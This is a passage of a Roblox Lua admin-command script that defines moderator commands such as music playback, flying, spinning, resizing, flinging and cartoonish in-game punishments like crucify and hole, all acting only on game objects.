                                torso.BrickColor=tor
                                larm.BrickColor=lar
                                rarm.BrickColor=rar
                                lleg.BrickColor=lle
                                rleg.BrickColor=rle
                                head.BrickColor=hea
                        end
                end
        end
end)
 
set.MakeCommand('Makes the target player(s) say interesting things, makes it hard for them to walk, and eventually kills them',-1,set.Prefix,{'drug','intoxicate'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
                set.Remote(v,'Function','Drug')
        end
end)
 
set.MakeCommand('Change the pitch o the currently playing song',2,set.Prefix,{'pitch'},{'number'},1,function(plr,args)
coroutine.wrap(function()
local pitch = args[1]
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v.Pitch=pitch end end
end)()
end)
 
set.MakeCommand('Start playing a song',2,set.Prefix,{'music','song','playsong'},{'id'},1,function(plr,args)
coroutine.wrap(function()
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = args[1]:lower()
local pitch = 1
local mp = game:service('MarketplaceService')
local volume = 1
for i,v in pairs(set['MusicList']) do if id==v.Name:lower() then id=v.Id if v.Pitch then pitch=v.Pitch end if v.Volume then volume=v.Volume end end end
local name = 'Invalid ID '
pcall(function() if mp:GetProductInfo(id).AssetTypeId==3 then name = 'Now playing '..mp:GetProductInfo(id).Name end end)
local s = Instance.new("Sound")
s.Name='Sound'..set.RemoteObject
s.Parent=workspace
s.SoundId = "http://www.roblox.com/asset/?id=" .. id
s.Volume = volume
s.Pitch = pitch
s.Looped = true
s.archivable = false
pcall(function() s:Play()end)
set.Hint(name..' ('..id..')',game:service('Players'):children())
end)()
end)
 
set.MakeCommand('Stop the currently playing song',2,set.Prefix,{'stopmusic','musicoff'},{},0,function(plr,args)
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end)
 
set.MakeCommand('Shows you the script\'s available music list',2,set.Prefix,{'musiclist','listmusic','songs'},{},0,function(plr,args)
local listforclient={}
for i, v in pairs(set['MusicList']) do
table.insert(listforclient,v.Name)
end
--set.Remote(plr,'SetSetting','MusicList',listforclient)
set.Remote(plr,'Function','ListGui','Music List',listforclient)
end)
 
set.MakeCommand('Turns the target player(s) into a stick figure',-1,set.Prefix,{'stickify','stick','stickman'},{'player'},1,function(plr,args)
        local plrz = set.GetPlayers(plr, args[1]:lower())
        for kay, player in pairs(plrz) do
        coroutine.wrap(function()
        local m = player.Character
        for i,v in pairs(m:GetChildren()) do
        if v:IsA ("Part") then
        local s = Instance.new("SelectionPartLasso")
        s.Parent = m.Torso
        s.Part = v
        s.Humanoid = m.Humanoid
        s.Color = BrickColor.new(0,0,0)
        v.Transparency = 1
        m.Head.Transparency = 0
        m.Head.Mesh:Remove()
        local b = Instance.new("SpecialMesh")
        b.Parent = m.Head
        b.MeshType = "Sphere"
        b.Scale = Vector3.new(.5,1,1)
        m.Head.BrickColor = BrickColor.new("Black")
        end
        end
        end)()
        end
end)
 
set.MakeCommand('Sends the target player(s) down a hole',-1,set.Prefix,{'hole','sparta'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for kay, player in pairs(plrz) do
coroutine.wrap(function()
local torso=player.Character:FindFirstChild('Torso')
if torso then
local hole = Instance.new("Part",player.Character)
hole.Anchored = true
hole.CanCollide = false
hole.formFactor = Enum.FormFactor.Custom
hole.Size = Vector3.new(10,1,10)
hole.CFrame = torso.CFrame * CFrame.new(0,-3.3,-3)
hole.BrickColor = BrickColor.new("Really black")
local holeM = Instance.new("CylinderMesh",hole)
torso.Anchored = true
local foot = torso.CFrame * CFrame.new(0,-3,0)
for i=1,10 do
torso.CFrame = foot * CFrame.fromEulerAnglesXYZ(-(math.pi/2)*i/10,0,0) * CFrame.new(0,3,0)
wait()
end
for i=1,5,0.2 do
torso.CFrame = foot * CFrame.new(0,-(i^2),0) * CFrame.fromEulerAnglesXYZ(-(math.pi/2),0,0) * CFrame.new(0,3,0)
wait()
end
player.Character.Humanoid.Health=0
end
end)()
end
end)
 
set.MakeCommand('Crucifies the target players(s) (Old Roman punishment done to thousands of people, saying its offensive only means you are ignorant)',-1,set.Prefix,{'crucify','cross'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
                local torso=v.Character['Torso']
                local larm=v.Character['Left Arm']
                local rarm=v.Character['Right Arm']
                local lleg=v.Character['Left Leg']
                local rleg=v.Character['Right Leg']
                local head=v.Character['Head']
                if torso and larm and rarm and lleg and rleg and head and not v.Character:FindFirstChild(v.Name..'kohlscrusify') then
                        local cru=Instance.new('Model',v.Character)
                        cru.Name=v.Name..'kohlscrusify'
                        local c1=Instance.new('Part',cru)
                        c1.BrickColor=BrickColor.new('Reddish brown')
                        c1.Material='Wood'
                        c1.CFrame=(v.Character.Torso.CFrame-v.Character.Torso.CFrame.lookVector)*CFrame.new(0,0,2)
                        c1.Size=Vector3.new(2,18.4,1)
                        c1.Anchored=true
                        local c2=c1:Clone()
                        c2.Parent=cru
                        c2.Size=Vector3.new(11,1.6,1)
                        c2.CFrame=c1.CFrame+Vector3.new(0,5,0)
                        torso.Anchored=true
                        wait(0.5)
                        torso.CFrame=c2.CFrame+torso.CFrame.lookVector+Vector3.new(0,-1,0)
                        wait(0.5)
                        larm.Anchored=true
                        rarm.Anchored=true
                        lleg.Anchored=true
                        rleg.Anchored=true
                        head.Anchored=true
                        wait()
                        larm.CFrame=torso.CFrame*CFrame.new(-1.5,1,0)
                        rarm.CFrame=torso.CFrame*CFrame.new(1.5,1,0)
                        lleg.CFrame=torso.CFrame*CFrame.new(-0.1,-1.7,0)
                        rleg.CFrame=torso.CFrame*CFrame.new(0.1,-1.7,0)
                        larm.CFrame=larm.CFrame*CFrame.Angles(0,0,-140)
                        rarm.CFrame=rarm.CFrame*CFrame.Angles(0,0,140)
                        lleg.CFrame=lleg.CFrame*CFrame.Angles(0,0,0.6)
                        rleg.CFrame=rleg.CFrame*CFrame.Angles(0,0,-0.6)
                        --head.CFrame=head.CFrame*CFrame.Angles(0,0,0.3)
                        local n1=Instance.new('Part',cru)
                        n1.BrickColor=BrickColor.new('Dark stone grey')
                        n1.Material='DiamondPlate'
                        n1.Size=Vector3.new(0.2,0.2,2)
                        n1.Anchored=true
                        local m=Instance.new('BlockMesh',n1)
                        m.Scale=Vector3.new(0.2,0.2,0.7)
                        n2=n1:clone()
                        n2.Parent=cru
                        n3=n1:clone()
                        n3.Parent=cru
                        n1.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(2,0,0)
                        n2.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(-2,0,0)
                        n3.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(0,-3,0)
                        coroutine.wrap(function()
                                repeat
                                        wait(0.1)
                                        v.Character.Humanoid.Health=v.Character.Humanoid.Health-0.6
                                        local p = Instance.new("Part",v.Character)
                                        p.CanCollide = false
                                        local color = math.random(1, 3)
                                        local bcolo
                                        if color == 1 then
                                                bcolor = BrickColor.new(21)
                                                parent=n1
                                        elseif color == 2 then
                                                bcolor = BrickColor.new(1004)
                                                parent=n2
                                        elseif color == 3 then
                                                bcolor = BrickColor.new(21)
                                                parent=n3
                                        end
                                        p.BrickColor = bcolor
                                        local m=Instance.new('BlockMesh',p)
                                        p.Size=Vector3.new(0.1,0.1,0.1)
                                        m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
                                        p.Locked = true
                                        p.TopSurface = "Smooth"
                                        p.BottomSurface = "Smooth"
                                        p.CFrame = parent.CFrame
                                        p.Anchored = false
                                        m.Name='Blood Peice'
                                        p.Name='Blood Peice'
                                        p.Touched:connect(function(o)
                                                if o and p and o~=parent and o~=n1 and o~=n2 and o~=n3 and o~=c1 and o~=c2 and o.Parent~=cru and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
                                                        local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
                                                        p:Destroy()
                                                        local g=Instance.new('Part',workspace)
                                                        g.Anchored=true
                                                        g.CanCollide=false
                                                        g.Size=Vector3.new(0.1,0.1,0.1)
                                                        g.Name='Blood Plate'
                                                        g.CFrame=cf
                                                        g.BrickColor=BrickColor.new(21)
                                                        local c=Instance.new('CylinderMesh',g)
                                                        c.Scale=Vector3.new(1,0.2,1)
                                                        c.Name='BloodMesh'
                                                        wait(10)
                                                        g:Destroy()
                                                elseif o and o.Name=='Blood Plate' and p then
                                                        p:Destroy()
                                                        o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(1,0,1)
                                                end
                                        end)
                                until (not cru) or (not cru.Parent) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character.Humanoid.Health<=0
                        end)()
                end
        end
end)
 
set.MakeCommand('Lets the target player(s) fly',2,set.Prefix,{'fly','flight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        set.Remote(v,'Function','Effect','fly')
end
end)
 
set.MakeCommand('Removes the target player(s)\'s ability to fly',2,set.Prefix,{'unfly','ground'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
        set.Remote(v,'Function','Effect','unfly')
end
end)
 
set.MakeCommand('Turns the place into a disco party',-1,set.Prefix,{'disco'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask = true
repeat
if set.lighttask==false then return end
local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game:service('Lighting').Ambient = color
game:service('Lighting').OutdoorAmbient = color
game:service('Lighting').FogColor = color
wait(0.1)
until set.lighttask==false
end)()
end)
 
set.MakeCommand('Makes the place flash',-1,set.Prefix,{'flash'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask=true
repeat
if set.lighttask==false then return end
game:service('Lighting').Ambient = Color3.new(1,1,1)
game:service('Lighting').OutdoorAmbient = Color3.new(1,1,1)
game:service('Lighting').FogColor = Color3.new(1,1,1)
game:service('Lighting').Brightness = 1
game:service('Lighting').TimeOfDay = 14
wait(0.1)
game:service('Lighting').Ambient = Color3.new(0,0,0)
game:service('Lighting').OutdoorAmbient = Color3.new(0,0,0)
game:service('Lighting').FogColor = Color3.new(0,0,0)
game:service('Lighting').Brightness = 0
game:service('Lighting').TimeOfDay = 0
wait(0.1)
until set.lighttask==false
end)()
end)
 
set.MakeCommand('Makes the target player(s) spin',-1,set.Prefix,{'spin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(set.objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s) stop spinning',-1,set.Prefix,{'unspin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Turn the target player(s) into a dog',-1,set.Prefix,{'dog','dogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end)()
end
end)
 
set.MakeCommand('Turn them back to normal',-1,set.Prefix,{'undog','undogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)
 
set.MakeCommand('Turn the target player(s) into a creeper',-1,set.Prefix,{'creeper','creeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end)()
end
end)
 
set.MakeCommand('Turn the target player(s) back to normal',-1,set.Prefix,{'uncreeper','uncreeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)
 
set.MakeCommand('Give the target player(s) a larger ego',-1,set.Prefix,{'bighead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)
 
set.MakeCommand('Resize the target player(s)\'s character by <number>',-1,set.Prefix,{'resize','size'},{'player','number'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
         if not (v and v.Character and v.Character:findFirstChild('Torso') and v.Character:findFirstChild('HumanoidRootPart')) then return end
                local ags = {c = v.Character, t = v.Character.Torso, r = v.Character.HumanoidRootPart}
                ags.t.Anchored = true ags.t.BottomSurface = 0 ags.t.TopSurface = 0
                local welds = {} --Credit to Drezmor for the orig command, credit to Kohltastrophe for making it work correctly l0l
                for i2,v2 in pairs(ags.c:children()) do
                if v2:IsA('BasePart') then v2.Anchored = true
                elseif v2:IsA('Pants') or v2:IsA('Shirt') then v2.Parent = ags.t
                end
                end
                print(args[2])
                local function size(p)
                for i2,v2 in pairs(p:children()) do
                if v2:IsA('Weld') or v2:IsA('Motor') or v2:IsA('Motor6D') then
                local p1 = v2.Part1 p1.Anchored = true v2.Part1 = nil
                local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C0:components() v2.C0 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
                local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C1:components() v2.C1 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
                if p1.Name ~= 'Head' and p1.Name ~= 'Torso' then
                p1.formFactor = 3
                p1.Size = p1.Size*args[2]
                elseif p1.Name ~= 'Torso' then
                p1.Anchored = true
                for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = nil v3.Part1.Anchored = true end end
                p1.formFactor = 3 p1.Size = p1.Size*args[2]
                for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = p1 v3.Part1.Anchored = false end end
                end
                if v2.Parent == ags.t then p1.BottomSurface = 0 p1.TopSurface = 0 end
                p1.Anchored = false
                v2.Part1 = p1
                if v2.Part0 == ags.t then table.insert(welds,v2) p1.Anchored = true v2.Part0 = nil end
                elseif v2:IsA('CharacterMesh') then
                local bp = tostring(v2.BodyPart):match('%w+.%w+.(%w+)')
                local msh = Instance.new('SpecialMesh')
                if bp and ags.c:findFirstChild(bp) then msh.Parent = ags.c:findFirstChild(bp) end
                msh.MeshId = 'http://www.roblox.com/asset/?id='..v2.MeshId
                if v2.BaseTextureId ~= 0 or v2.BaseTextureId ~= '0' then msh.TextureId = 'http://www.roblox.com/asset/?id='..v2.BaseTextureId end
                msh.Scale = msh.Scale*args[2] v2:Destroy()
                elseif v2:IsA('SpecialMesh') and v2.Parent ~= ags.c.Head then v2.Scale = v2.Scale*args[2]
                end size(v2)
                end
                end
                size(ags.c)
                ags.t.formFactor = 3
                ags.t.Size = ags.t.Size*args[2]
                for i2,v2 in pairs(welds) do v2.Part0 = ags.t v2.Part1.Anchored = false end
                for i2,v2 in pairs(ags.c:children()) do if v2:IsA('BasePart') then v2.Anchored = false end end
                local weld = Instance.new('Weld',ags.r) weld.Part0 = ags.r weld.Part1 = ags.t
        end
end)
 
set.MakeCommand('Give the target player(s) a small head',-1,set.Prefix,{'smallhead','minihead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)
 
set.MakeCommand('Fling the target player(s)',2,set.Prefix,{'fling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s)\'s character spazz out on the floor',-1,set.Prefix,{'seizure'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character:FindFIrstChild('Torso') then
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0)
set.Remote(v,'Function','Effect','seizure')
end
end)()
end
end)
 
set.MakeCommand('Removes the effects of the seizure command',-1,set.Prefix,{'unseizure'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
set.Remote(v,'Function','Effect','unseizure')
end
end)
 
set.MakeCommand('Remove the target player(s)\'s arms and legs',-1,set.Prefix,{'removelimbs','delimb'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end)()
end
end)
 
set.MakeCommand('Name the target player(s) <name> or say hide to hide their character name',2,set.Prefix,{'name','rename'},{'player','name/hide'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:findFirstChild("Head") then
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local head = char:FindFirstChild('Head')
local mod = Instance.new("Model", char) mod.Name = args[2] or ''
local cl = char.Head:Clone() cl.Parent = mod
local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
coroutine.wrap(function()
if args[2]:lower()~='hide' then
        repeat hum.MaxHealth=hum.MaxHealth hum.Health=v.Character.Humanoid.Health wait() until not v or not v.Parent or not char or not head or not hum or not mod or not mod.Parent or mod==nil or hum==nil or not hum.Parent
else
        mod.Name=''
end
end)()
cl.CanCollide=false
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end)()
end
end)
 
set.MakeCommand('Put the target player(s)\'s back to normal',2,set.Prefix,{'unname','fixname'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Head") then
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Change the target player(s)\'s Right Leg package',-1,set.Prefix,{'rleg','rightleg','rightlegpackage'},{'player','id'},2,function(plr,args)
        local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
        if id~=31 then set.Remote(plr,'Function','OutputGui','Id is not a right leg!') return end
        local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightLeg' then m:Destroy() end end
                part.Parent=v.Character
        end
end)
 
set.MakeCommand('Change the target player(s)\'s Left Leg package',-1,set.Prefix,{'lleg','leftleg','leftlegpackage'},{'player','id'},2,function(plr,args)
        local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
        if id~=30 then set.Remote(plr,'Function','OutputGui','Id is not a left leg!') return end
        local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftLeg' then m:Destroy() end end
                part.Parent=v.Character
        end
end)
 
set.MakeCommand('Change the target player(s)\'s Right Arm package',-1,set.Prefix,{'rarm','rightarm','rightarmpackage'},{'player','id'},2,function(plr,args)
        local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
        if id~=28 then set.Remote(plr,'Function','OutputGui','Id is not a right arm!') return end
        local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightArm' then m:Destroy() end end
                part.Parent=v.Character
        end
end)
 
set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'larm','leftarm','leftarmpackage'},{'player','id'},2,function(plr,args)
        local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
        if id~=29 then set.Remote(plr,'Function','OutputGui','Id is not a left arm!') return end
        local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftArm' then m:Destroy() end end
                part.Parent=v.Character
        end
end)
 
set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'torso','torsopackage'},{'player','id'},2,function(plr,args)
        local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
        if id~=27 then set.Remote(plr,'Function','OutputGui','Id is not a torso!') return end
        local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='Torso' then m:Destroy() end end
                part.Parent=v.Character
        end
end)
 
set.MakeCommand('Changes the target player(s)\'s character appearence to <ID>',-1,set.Prefix,{'char','character','appearance'},{'player','ID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. args[2]
v:LoadCharacter()
end
end)()
end
end)
 
set.MakeCommand('Put the target player(s)\'s character appearence back to normal',-1,set.Prefix,{'unchar','uncharacter','fixappearance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. v.userId
v:LoadCharacter()
end
end)()
end
end)
 
set.MakeCommand('Turn the target player(s) into a suit zombie',-1,set.Prefix,{'infect','zombify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Infect(v.Character)
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s)\'s character flash random colors',-1,set.Prefix,{'rainbowify','rainbow'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
set.Remote(v,'Function','Effect','rainbowify')
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s)\'s character flash',-1,set.Prefix,{'flashify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
